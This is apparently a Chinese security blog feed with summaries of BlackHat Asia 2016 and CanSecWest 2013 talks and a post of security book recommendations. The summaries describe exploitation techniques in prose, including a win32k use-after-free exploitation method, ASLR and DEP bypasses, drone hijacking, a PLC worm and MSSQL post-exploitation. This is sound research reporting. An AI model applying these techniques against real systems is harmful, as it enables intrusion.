&lt;h3 id=&quot;6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot;&gt;&lt;a href=&quot;#6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot; class=&quot;headerlink&quot; title=&quot;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&quot;&gt;&lt;/a&gt;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598447131786.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍iOS企业证书滥用的问题，并列举近年来出现过一些大的iOS安全事件，比如”假面攻击“、WireLurker病毒等等案例，同时讲述其它存在的风险，==比如通过中间人方式去劫持企业的移动设备管理服务器，然后替换请求安装的app，从而使得用户安装被企业证书签名过的恶意软件==。&lt;/p&gt;
&lt;h3 id=&quot;7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot;&gt;&lt;a href=&quot;#7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot; class=&quot;headerlink&quot; title=&quot;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&quot;&gt;&lt;/a&gt;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598465162889.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;列举出当前Linux和PaX(用于安全加固的Linux内核补丁)平台上的ASLR绕过漏洞，共有4个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==低熵==，即地址随机度不够，可被暴力破解，尤其是32位系统&lt;/li&gt;
&lt;li&gt;==非均匀分布随机地址==，呈驼峰型分布，因此有部分地址存在高命中率&lt;/li&gt;
&lt;li&gt;==利用对象间的相对地址偏移实现绕过==，即Offset2Lib攻击方法&lt;/li&gt;
&lt;li&gt;==进程继承缺陷==，所有子进程共享相同的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后提出下一代ASLR防护机制：ASLR-NG，以解决上述问题。&lt;/p&gt;
&lt;h3 id=&quot;8、《Hacking-a-Professional-Drone》&quot;&gt;&lt;a href=&quot;#8、《Hacking-a-Professional-Drone》&quot; class=&quot;headerlink&quot; title=&quot;8、《Hacking a Professional Drone》&quot;&gt;&lt;/a&gt;8、《Hacking a Professional Drone》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598494382580.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;议题中提出两种攻击无人机的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==破解WEP加密的WiFi密码==，直接接入与遥控器通讯；&lt;/li&gt;
&lt;li&gt;==伪造XBee 868LP通讯设备作为中间人==，发送控制指令（逆向Android客户端获得指令序列），从而实现无人机的劫持&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;：==从攻击难度看，此款无人机的安全性比较低，跟大疆无人机存在较大差距==。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot;&gt;&lt;a href=&quot;#9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot; class=&quot;headerlink&quot; title=&quot;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&quot;&gt;&lt;/a&gt;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599077404076.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于KeenLab分享的Android Binder Fuzzing相关的议题，分析出Binder存在的攻击面，然后制定相应的Fuzzing策略。&lt;br&gt;&lt;strong&gt;【亮点一】&lt;/strong&gt;：==从Android C++源码中自动化提取各Binder服务通讯中的 Transaction Code、参数类型及序号、远程服务的调用方式，然后生成json文件，依据它来作参数变异==。如果是闭源的Binder服务，比如华为手机，则通过IDAPython从程序中提取上述信息。&lt;br&gt;&lt;strong&gt;【亮点二】&lt;/strong&gt;：==开启ASAN（AddressSanitize）去编译源码==，加强程序自主的错误检测能力，同时==结合AFL==（Google开发的一款基于源码插桩的Fuzzer工具，曾被用于刷过N多CVE漏洞）去做Fuzzing，==但AFL是基于文件输入的，而Binder未提供此功能，因此KeenLab也未完全实现，这是他们一直在尝试做的工作==。&lt;br&gt;&lt;strong&gt;【亮点三】&lt;/strong&gt;：最后以几个Binder服务漏洞作为实例分析漏洞成因，并分享了CVE-2015-6620 MediaCodecInfo 越界访问漏洞的利用技巧，采用ROP与Heap Spray去绕过NX与ASLR。&lt;/p&gt;
&lt;h3 id=&quot;10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot;&gt;&lt;a href=&quot;#10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot; class=&quot;headerlink&quot; title=&quot;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&quot;&gt;&lt;/a&gt;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599122751659.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google的reCAPTCHA是一款验证码生成系统，作者分享了一些绕过该验证码系统的方法。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过深度学习为图片注释，使用基于Word2Vec神经网络进行深度学习去为图片标记归类&lt;/li&gt;
&lt;li&gt;收集样本图片、提示信息、注释标签等信息&lt;/li&gt;
&lt;li&gt;通过Google服务（图片搜索、翻译等）获取关键词&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot;&gt;&lt;a href=&quot;#11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot; class=&quot;headerlink&quot; title=&quot;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&quot;&gt;&lt;/a&gt;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599134045481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享物联网产品中常用的无线电安全问题，比如ZigBee、WiFi、GSM、NFC、车钥匙信号等等。介绍分析无线电的硬件、软件工具，以及常见的TOP 10无线安全问题，前3名分别是：未加密通讯、信息重放攻击、密钥交换漏洞。&lt;br&gt;==【PS】:主要是无线电安全的基础知识的概述，工具和常见漏洞类型等等，无实例漏洞分析，里面涉及的内容，预研侧此前大多有分析过。==&lt;/p&gt;
&lt;h3 id=&quot;12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot;&gt;&lt;a href=&quot;#12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot; class=&quot;headerlink&quot; title=&quot;12、《PLC-Blaster：A Worm Living Solely in the PLC》&quot;&gt;&lt;/a&gt;12、《PLC-Blaster：A Worm Living Solely in the PLC》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599217768327.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者开发出一款叫PLC-Blaster的PLC（可编程控制器）蠕虫病毒，以西门子S7-1200版本1到3的PLC为例。西门子PLC使用自定义协议去上传和下载用户程序到PLC，也可以读取PLC相关诊断信息，因此常被用作攻击PLC的手段之一。此款PLC病毒使用SCL编程语言实现的，它会去扫描本地网络，若发现其它PLC则会上传病毒进行感染，实现自我传播的功能。同时它还会主动连接C&amp;amp;C服务器，以实现远程控制功能。&lt;br&gt;==【PS】：难点就在于对S7-1200 PLC的协议分析，只有分析清楚之后，才能使用SCL去实现自我传播的功能。==&lt;/p&gt;
&lt;h3 id=&quot;13、《Practical-New-Developments-In-The-BREACH-Attack》&quot;&gt;&lt;a href=&quot;#13、《Practical-New-Developments-In-The-BREACH-Attack》&quot; class=&quot;headerlink&quot; title=&quot;13、《Practical New Developments In The BREACH Attack》&quot;&gt;&lt;/a&gt;13、《Practical New Developments In The BREACH Attack》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599232870147.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享关于SSL BREACH（超文本自适应压缩浏览器勘测与渗透）攻击方法的新进展，BREACH攻击方法最初是在&lt;a href=&quot;http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;BlackHat USA 2013大会&lt;/a&gt;被公布的。作者开发出一款叫”rupture“的攻击框架，并在&lt;a href=&quot;https://github.com/dionyziz/rupture&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;上开源，用于实现改进后的BREACH攻击，以及针对其它压缩加密算法的攻击。&lt;/p&gt;
&lt;h3 id=&quot;14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot;&gt;&lt;a href=&quot;#14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot; class=&quot;headerlink&quot; title=&quot;14、《The Perl Jam 2: The Camel Strikes Back》&quot;&gt;&lt;/a&gt;14、《The Perl Jam 2: The Camel Strikes Back》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599279606791.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Perl在之前被发现存在多个高危漏洞，而官方一直将问题归结于开发者，作者表示很气愤，认为这个锅不应该由开发者来背。于是，作者分享了他发现的存在于perl核心模块0day漏洞，此漏洞影响所有使用perl开发CGI的程序，可造成远程代码执行。&lt;/p&gt;
&lt;h3 id=&quot;15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot;&gt;&lt;a href=&quot;#15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot; class=&quot;headerlink&quot; title=&quot;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&quot;&gt;&lt;/a&gt;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599250665173.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享==非越狱iOS平台==上的恶意软件相关的议题，列举过去的发生的一些案例，然后总结出一些恶意软件的常用工具和方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==重打包==：在正常应用中加入恶意代码，然后重新签名打包&lt;/li&gt;
&lt;li&gt;==Dylib注入==&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cycript&lt;/a&gt;：支持javascript和OC语法的解析工具，可用于调试运行时程序，支持越狱与非越狱平台&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Theos&lt;/a&gt;：iOS平台上的Hook框架，支持越狱与非越狱平台，但仍需要开发者帐号用于签名，详见：====&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Fastlane tools&lt;/a&gt;：iOS开发的持续集成框架，用于实现实现应用发布流程的自动化。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后作者开源出一款叫”==&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Su-A-Cyder&lt;/a&gt;==“的iOS恶意软件生成工具，后面作者还打算尝试将Metasploit移植到未越狱的iOS平台上。&lt;/p&gt;
&lt;h3 id=&quot;16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot;&gt;&lt;a href=&quot;#16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot; class=&quot;headerlink&quot; title=&quot;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&quot;&gt;&lt;/a&gt;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599283806453.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者分享了如何利用深度学习与自然语言处理去建立一个基于实时分析海量DNS数据的威胁监控框架，主要用于检测恶意钓鱼的域名站点，并发现了不少伪造Google、Apple、Paypal等知名站点的钓鱼网站。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;br&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>购书心得</title>
    <link href="http://riusksk.github.io/2014/03/21/buybook/"/>
    <id>http://riusksk.github.io/2014/03/21/buybook/</id>
    <published>2014-03-20T16:00:00.000Z</published>
    <updated>2016-06-18T12:16:18.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；&lt;br&gt;出门莫恨无人随，书中车马多如簇；&lt;br&gt;娶妻莫恨无良媒，书中自有颜如玉；&lt;br&gt;男儿若遂平生志，六经勤向窗前读。&lt;br&gt;&lt;/center&gt;                      &lt;/p&gt;
&lt;p align=&quot;right&quot;&gt; —— 宋真宗赵恒《劝学诗》 &lt;/p&gt;


&lt;h3 id=&quot;移动安全篇&quot;&gt;&lt;a href=&quot;#移动安全篇&quot; class=&quot;headerlink&quot; title=&quot;移动安全篇&quot;&gt;&lt;/a&gt;移动安全篇&lt;/h3&gt;&lt;p&gt;国 内移动安全书籍很少，主要还是以国外的居多，虽然大部分未引进，但是很多可以在网上找到高清彩色英文原版，有些可能就是官方自己发出来的。虽然国外这方面 的书籍多，但看过几本Andorid安全书籍，感觉还是一般，深度不够，比如《Android Security：Attacks and Defenses》、《Android Apps Security》、《Mobile Application Security》、《Mobile Malware Attacks and Defense》,国内的《移动互联网之智能终端安全揭秘》也是不推荐，过多列点组装，缺乏个人主观理解，《Android安全机制解析与应用实践》更是 别买，学术派写的wiki式书籍。笔者推荐几本：《Android Security Cookbook》、《Android 软件安全与逆向分析》主要是讲Android应用安全，Android系统安全的书籍尚无专著出版，不过4月份《Android Hacker’s Handbook》就要出版了，看目录还是感觉蛮有料的，iOS安全书籍相对少一些，主要有《iOS Hacker’s Handbook》（主要讲系统安全，别买中文版，译者缺乏软件安全基础，错误太多，令人不忍直视）、《iOS应用安全攻防》（英文版，偏向应用安全）、 《iOS应用逆向工程:分析与实战》（今年刚出的iOS应用逆向方面的书籍），其它关于Android与iOS开发的书籍，网上电子版很多，自己挑着看 吧，移动安全方面的书籍，我大多是看电子书，买的纸质书基本都是不行。所以目前，移动安全书籍，还是尽量看国内英文原版吧，如果对Android安全感兴 趣的，看下《Android Hacker’s Handbook》一书（补充：目前网上已有电子版）。&lt;/p&gt;
&lt;h3 id=&quot;程序设计篇&quot;&gt;&lt;a href=&quot;#程序设计篇&quot; class=&quot;headerlink&quot; title=&quot;程序设计篇&quot;&gt;&lt;/a&gt;程序设计篇&lt;/h3&gt;&lt;p&gt;此处 程序语言主要以C、ASM为主，毕竟自己主要也只是学这两门语言，其它脚本语言，如PHP、ASP就不提了。关于C语言的书籍就有传说中的 “C语言四大名著”，即《C程序设计语言》、《C和指针》、《C陷阱与缺陷》、《C专家编程》，感觉在C编程上这几本书就够用了，至于数据结构和算法可参 考其它国外名著。国产的编程书籍没几本可出手的，关于C入门书籍，很多人会推荐谭浩强那书，最初我也是读这本书入门的，但后来慢慢地发觉那书不是很好，错 误不少，编程风格也不好。对于那些写着精通XXX、24小时XXX、30天XXX、XXX从入门到精通，这些书都是拿书名来忽悠人的，纯粹是作者用来骗稿 费的，对比一下那些国外名著的书名就知道了，一本好书一般是不会用那些土名字的。我很赞成SAI兄弟说的，半年之内不接触的技术，就不用去买这方面的书籍 了。关于ASM主要就《80x86汇编语言程序设计》、《windows环境下的32位汇编程序设 计》这两本，汇编语言的书籍相对会少一点，一些网上书店的程序设计一栏中甚至没有asm一类。很多编程书籍的内容写的都是千篇一律，比如C语言书籍， 不外乎都是些变量、数组、指针这些，但是某些书籍中就会有提到编程风格、内存优化、树、链表、折半搜索法，GDB调试，linux方面的知识，比如《c primer plus》《C和指针》，这些也算是书本的一个亮点。关于windows编程，首推《windows程序设计》上下册、《windows核心编程》，其它 的感觉也没必要看太多，还是以实践为主。编程书籍由于附有很多代码，在电脑上看电子版的感觉很伤眼，容易眼疲劳，因此有必要的话，可以买实体书来看，而且 在实际应用中，有时可以再拿出来参考参考，方便查阅。与此同时，也要奉劝大家“纸上得来终觉浅，绝知此事要躬行”，特别是对于编程学习者，一定要动手写代 码，光看书是没用，这也是我曾经犯过的错误！而且有些书是用来参考查阅，不是用来看的，不然即使你把那些牛书都看完 ，到最后也可能连几句代码也写不出来，最后受伤的永远是你自己！&lt;/p&gt;
&lt;h3 id=&quot;逆向工程篇&quot;&gt;&lt;a href=&quot;#逆向工程篇&quot; class=&quot;headerlink&quot; title=&quot;逆向工程篇&quot;&gt;&lt;/a&gt;逆向工程篇&lt;/h3&gt;&lt;p&gt;关于逆向工程这方面的书籍，自然是首 推看雪出版的《加密与解密》，在这方面，看雪的实力不会比国外的差，那里是逆向学习交流的好场所。在加解密第3版出版的时候就曾出现过山寨版的，因此大家 在购买时得看清楚了，最好到正规的书店购买，目前可能网上买不到了，不过网上有电子版。另外这方面的书籍还有《黑客反汇编揭密》《黑客调试技术揭密》 《逆向工程揭密》，国内出版的《软件调试》也是本牛书，弥补了国内这方面的空缺。还有出版的《IDA权威指南》也是本不错的书籍，详细讲解了IDA的 方方面面，看了之后，你会发现，会用IDA与不会用的差别有多大了。看雪翻译小组也曾出版过一本《IDA Pro代码破解揭秘》，不过这书我也没看过。在逆向工程这方面的书籍也差不多就这么几本了，其它像加解密入门实战，加密与解密实战超级手册，加解密全攻 略……这些基本上都可以摒弃，基本都是抄看雪加解密一书上的东西，大家无须花金钱、时间和精力在此上面。关于获取最新书讯的方法，大家可以订阅&lt;a href=&quot;http://china-pub.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;互动出版网&lt;/a&gt; 计算机新书的RSS，只要有计算机新书出来立马就知道了，它上面经常更新，不过很也是应用技术书籍，对于这些书籍，很多是 没必要买的，比如什么 windows 7使用大全，精通注册表，windows操作XXX，有必要的话，直接百度、google就行了，没必要花钱去买这类书籍。&lt;/p&gt;
&lt;h3 id=&quot;脚本安全篇&quot;&gt;&lt;a href=&quot;#脚本安全篇&quot; class=&quot;headerlink&quot; title=&quot;脚本安全篇&quot;&gt;&lt;/a&gt;脚本安全篇&lt;/h3&gt;&lt;p&gt;在 脚本攻防方面的书籍，最早的曾云好写的《精通黑客脚本》，这书写得相当全面，由浅入深，虽然不厚，但排版密集，内容还是很多的，只是纸质不太好，很 粗糙，里面有很多渗透实战案例，当年国内这方面的法律还不是很严格，若是放在今天，可能里面一些内容会被删除掉。另外大家也可看看老外的 《黑客攻防技术宝典：WEB实战篇》（重点推荐）《xss attack》《sql injection》（中译本：《SQL注入攻击与防御》），以及《WEB安全测试》，英文版的网上有电子书。近两年国内出版的，主要就《白帽子讲WEB 安全》、《WEB前端黑客技术》，推荐一阅。&lt;/p&gt;
&lt;h3 id=&quot;系统底层篇&quot;&gt;&lt;a href=&quot;#系统底层篇&quot; class=&quot;headerlink&quot; title=&quot;系统底层篇&quot;&gt;&lt;/a&gt;系统底层篇&lt;/h3&gt;&lt;p&gt;当年看的第一本系统原理书籍是《深入理解计算机系统》，很不错的一本书。其它此类书籍还有《深入解析windows操作系统》《widnows系统原理与 实现》等，国内之前还出了本 &lt;a href=&quot;http://www.amazon.cn/mn/detailmore?showtype=3700&amp;amp; prodid=zhbk934046&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《windows操作系统原理》&lt;/a&gt;，上面还写着重点大学计算机教材，后面看了乱雪博客上一篇文章后才知道那书是抄袭的，还被原作者控告了，最后还赔偿 了，当年我还从头看完了。关于溢出攻击的书籍，国内主要有《网络渗透技术》、《0day安全：软件漏洞分析技术》《灰帽黑客》，虽然 网渗一书很早出版，其中有些已经过时，但是其思想是不会过时的。若想获取最新书籍，最好的方法还是上面说的：订阅RSS。对于一些不熟悉的技术书籍，一定 要先看完整目录，然后找找网上是否有电子版的，如果有就先看看再决定是否再买，另外如果你已经买或看过同类的经典书籍，就需要重新考虑是否真的有必要买 了。讲了那么多要花钱的书，下面讲讲免费的一套，那就《intel开发手册》，这一套是由因特尔公司免费向全球赠送的书籍，共五本，之前我还订了两套，全 都从美国寄到学校来了，原本以为第一封邮件没收到，就再发了一封，没想到Intel居然连送两套过来，真是大方的不行啊！现在他们已经不再寄送纸质书，仅 寄送包含电子版的光盘。’&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>关于CanSecWest 2013大会</title>
    <link href="http://riusksk.github.io/2013/03/23/CanSecWest-2013/"/>
    <id>http://riusksk.github.io/2013/03/23/CanSecWest-2013/</id>
    <published>2013-03-22T16:00:00.000Z</published>
    <updated>2016-06-24T14:18:08.000Z</updated>
    
    <content type="html">&lt;p&gt;文档下载：&lt;a href=&quot;http://cansecwest.com/csw13archive.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cansecwest.com/csw13archive.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此次CanSecWest 2013大会的质量明显要高出BlackHat EU 2013很多，主要还是软件/系统安全为主，涉及漏洞利用和挖掘等技术。&lt;/p&gt;
&lt;h3 id=&quot;1、《Fuzzing-for-logic-and-state-issues》&quot;&gt;&lt;a href=&quot;#1、《Fuzzing-for-logic-and-state-issues》&quot; class=&quot;headerlink&quot; title=&quot;1、《Fuzzing for logic and state issues》&quot;&gt;&lt;/a&gt;1、《Fuzzing for logic and state issues》&lt;/h3&gt;&lt;p&gt;Peach Fuzzer框架的作者写的，主要是介绍peach3的新增特性，增加逻辑漏洞和无效的状态转换等问题，比如一些WEB认证的逻辑漏洞，PPT写得比较简洁，纯文字描述，不好完整理解，建议还是上官网看peach3的使用文档吧：&lt;a href=&quot;http://peachfuzzer.com/v3/PeachPit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://peachfuzzer.com/v3/PeachPit.html&lt;/a&gt; ，上个月作者刚更新的，写得比较详细。&lt;/p&gt;
&lt;h3 id=&quot;2、《DEP-ASLR-bypass-without-ROP-JIT》&quot;&gt;&lt;a href=&quot;#2、《DEP-ASLR-bypass-without-ROP-JIT》&quot; class=&quot;headerlink&quot; title=&quot;2、《DEP ASLR bypass without ROP JIT》&quot;&gt;&lt;/a&gt;2、《DEP ASLR bypass without ROP JIT》&lt;/h3&gt;&lt;p&gt;绿盟的TK讲的，里面的思路最早是在2009年的中国软件安全峰会《Vulnerability: The next 10 years》中提到的，主要是利用 SharedUserData 地址 0x7ffe0000 在win上是固定不变的，再通过它找到SystemCall，然后设置其参数，来调用指定的系统函数。在安全峰会上，作者是调用NtUserLockWorkStation这一函数来设置锁屏，而在此次CSW大会上，作者是通过LdrHotPatchRoutine索引到LdrLoadDll来加载外部的DLL，实现任意代码执行，这种方法只工作在winx64上的32位程序，且在win8上微软已经修复此问题。&lt;/p&gt;
&lt;h3 id=&quot;3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》&quot;&gt;&lt;a href=&quot;#3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》&quot; class=&quot;headerlink&quot; title=&quot;3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》&quot;&gt;&lt;/a&gt;3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》&lt;/h3&gt;&lt;p&gt;exploit系列教程的作者peter写的议题，在以前的一些大会上，也有人做过关于adobe sandbox的分享，但总觉得PPT写得不过详细，这次peter的议题，我觉得写得挺详细的，由浅入深，从介绍沙盒的相关术语、client与broker之间的通讯原理开始讲起，并提起一些沙盒逃逸的攻击面，分析和提取cross call函数等信息，同时也提供一些demo，可惜只有ppt，要是能提供paper和code就更好了。&lt;/p&gt;
&lt;h3 id=&quot;4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》&quot;&gt;&lt;a href=&quot;#4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》&quot; class=&quot;headerlink&quot; title=&quot;4、《An Android Hacker’s Journey- Challenges in Android Security Research》&quot;&gt;&lt;/a&gt;4、《An Android Hacker’s Journey- Challenges in Android Security Research》&lt;/h3&gt;&lt;p&gt;对我而言，里面让我最感兴趣的是作者即将出版的《Android Hacker’s Handbook》这个系列的书都很经典，包括shellcode、web、macosx以及ios等书，都是相当经典的，上面4本除了ios那书只看了一小部分之外，其它3本我都详细阅读过，值得推荐，前两本国内早有中译本了。&lt;br&gt;这个议题里面讲了一些android软件漏洞，包括一些组件权限设置问题导致的信息泄露，以及linux内核漏洞，其中还有一张赛门铁克提供的移动设备威胁图表，列出了移动设备可能面临的各种安全威胁，做得挺不错的。最后讲述了一些android平台的调试技巧，包括远程调试、源码调试等，有兴趣的朋友可以看下。&lt;/p&gt;
&lt;h3 id=&quot;5、《Assessing-the-Linux-Desktop’s-Security》&quot;&gt;&lt;a href=&quot;#5、《Assessing-the-Linux-Desktop’s-Security》&quot; class=&quot;headerlink&quot; title=&quot;5、《Assessing the Linux Desktop’s Security》&quot;&gt;&lt;/a&gt;5、《Assessing the Linux Desktop’s Security》&lt;/h3&gt;&lt;p&gt;感觉一般，对这议题也不是很感兴趣。&lt;/p&gt;
&lt;h3 id=&quot;6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》&quot;&gt;&lt;a href=&quot;#6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》&quot; class=&quot;headerlink&quot; title=&quot;6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》&quot;&gt;&lt;/a&gt;6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》&lt;/h3&gt;&lt;p&gt;讲述 MS SQL Server 利用技术，主要是利用扩展存储过程API来利用MSSQL，包括获取密码hash，内存搜索hash替换，编写poc创建后门，以及利用msf来控制shell等方式。在实际的渗透测试中，相信大多数的企业还是会选择使用php + mysql，特别是近些年来，这一组合的比例一直在扩大，所以估计对此文感兴趣的人不会太多。&lt;/p&gt;
